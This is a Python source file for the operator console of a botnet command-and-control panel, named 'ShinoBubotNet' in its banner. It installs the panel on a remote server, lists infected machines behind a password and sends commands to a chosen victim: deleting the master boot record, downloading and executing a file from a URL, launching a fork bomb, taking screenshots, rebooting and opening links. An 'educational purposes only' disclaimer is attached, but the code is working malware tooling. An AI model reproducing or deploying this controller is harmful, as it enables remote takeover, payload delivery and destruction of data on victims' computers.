import requests
import os
import sys
import time
from colorama import Fore, Back, init
#colorama init
init(autoreset=True)
#functions
def clear():
    os.system('clear')
def logo():
	print(logo)
	print(Fore.GREEN + "[!] - Server: " + url)
def comandhelp():
    print('1. MSG_BOX')

#logo
logo = Fore.MAGENTA + '''
░██████╗██╗░░██╗██╗███╗░░██╗░█████╗░██████╗░██╗░░░██╗██████╗░░█████╗░████████╗███╗░░██╗███████╗████████╗
██╔════╝██║░░██║██║████╗░██║██╔══██╗██╔══██╗██║░░░██║██╔══██╗██╔══██╗╚══██╔══╝████╗░██║██╔════╝╚══██╔══╝
╚█████╗░███████║██║██╔██╗██║██║░░██║██████╦╝██║░░░██║██████╦╝██║░░██║░░░██║░░░██╔██╗██║█████╗░░░░░██║░░░
░╚═══██╗██╔══██║██║██║╚████║██║░░██║██╔══██╗██║░░░██║██╔══██╗██║░░██║░░░██║░░░██║╚████║██╔══╝░░░░░██║░░░
██████╔╝██║░░██║██║██║░╚███║╚█████╔╝██████╦╝╚██████╔╝██████╦╝╚█████╔╝░░░██║░░░██║░╚███║███████╗░░░██║░░░
╚═════╝░╚═╝░░╚═╝╚═╝╚═╝░░╚══╝░╚════╝░╚═════╝░░╚═════╝░╚═════╝░░╚════╝░░░░╚═╝░░░╚═╝░░╚══╝╚══════╝░░░╚═╝░░░
'''
clear()
print(logo)

if(os.path.isfile('URL.txt') == False):
	#installion
	installion = input(Fore.YELLOW + 'Start installing the panel? (y/n): ')
	#USER AGREEMENT
	if (installion == "y"):
		print('USER AGREEMENT: ')
		print("I, the creator and all those associated with the development and production of this program are not responsible for any actions and or damages caused by this software. You bear the full responsibility of your actions and acknowledge that this software was created for educational purposes only. This software s intended purpose is NOT to be used maliciously, or on any system that you do not have own or have explicit permission to operate and use this program on. By using this software, you automatically agree to the above.")
		a = input(Fore.YELLOW + 'Do you accept this agreement? (y/n): ')
		if (a == 'y'):
			clear()
			URL = input(Fore.YELLOW + '[?] - Enter URL: ')
			print(requests.get(URL + 'install.php?ans=Yes'))
			print(Fore.GREEN + 'Installed')
			time.sleep(1)
			clear()
			#connect
			file = open('URL.txt', 'w')
			file.write(URL)
			file.close()
			print(Fore.GREEN + '[!] - url ' + URL + ' set')
			exit()
		else:
			exit()
	else:
    	#connect
		URL = input(Fore.YELLOW + '[?] - Enter URL: ')
		file = open('URL.txt', 'w')
		file.write(URL)
		file.close()
		print(Fore.GREEN + '[!] - url ' + URL + ' set')
		exit()

else:
	print(Fore.GREEN + '[!] - Get URL')
	file = open('URL.txt')
	url = file.read()
	print(Fore.GREEN + '[!] - URL set ' + url)
	password = input(Fore.YELLOW + 'Enter your password: ')
	userslist = requests.get(url + 'getusers.php?password=' + password)
	if(userslist.text == 'password error!'):
		print(Fore.RED  + 'Password error')
		exit()
	else:
		clear()
		print(logo)
		print(Fore.GREEN + "[!] - Server: " + url)
		print(userslist.text)
		if(userslist.text == None):
			print('no users')
			exit()
    			
		id = input('Enter user ID: ')
		clear()
		print(logo)
		print(Fore.GREEN + "[!] - Server: " + url)
		print(Fore.GREEN + 'User ' + id + ' set')
		comandhelp()
		command = input('Enter your command: ')
		if(command == "MSG_BOX"):
			content = input('Enter content: ')
			requests.get(url + 'sendcommand.php?password=' + password + '&id=' + id + 'type=msg_box&content=' + content)
			print(Fore.GREEN + 'comand send!')
		elif(command == "REBOOT"):
			requests.get(url + 'sendcommand.php?password=' + password + '&id=' + id + 'type=reboot')
			print(Fore.GREEN + 'comand send!')
		elif(command == "DELETE_MBR"):
			requests.get(url + 'sendcommand.php?password=' + password + '&id=' + id + 'type=MBR_DELETE')
			print(Fore.GREEN + 'comand send!')
		elif(command == "OPEN_LINK"):
			content = input('Enter URL: ')
			requests.get(url + 'sendcommand.php?password=' + password + '&id=' + id + 'type=open_link&content=' + content)
			print(Fore.GREEN + 'comand send!')
		elif(command == "EXIT"):
			requests.get(url + 'sendcommand.php?password=' + password + '&id=' + id + 'type=exit')
			print(Fore.GREEN + 'comand send!')
		elif(command == "DOWLOAND_AND_EXECUTE"):
			content = input('Enter URL: ')
			requests.get(url + 'sendcommand.php?password=' + password + '&id=' + id + 'type=download_execute&content=' + content)
			print(Fore.GREEN + 'comand send!')
		elif(command == "FORK_BOMB"):
			requests.get(url + 'sendcommand.php?password=' + password + '&id=' + id + 'type=forkbomb')
			print(Fore.GREEN + 'comand send!')
		elif(command == 'SCRENSHOT'):
			requests.get(url + 'sendcommand.php?password=' + password + '&id=' + id + 'type=screnshot')
			print(Fore.GREEN + 'comand send!')
		elif(command == "PING"):
			requests.get(url + 'ping/SendPingComand.php?id=' + id)
			print(Fore.GREEN + 'comand send!')
		elif(command == "HELP"):
			comandhelp()
		elif(command == "DISCONNECT"):
			exit()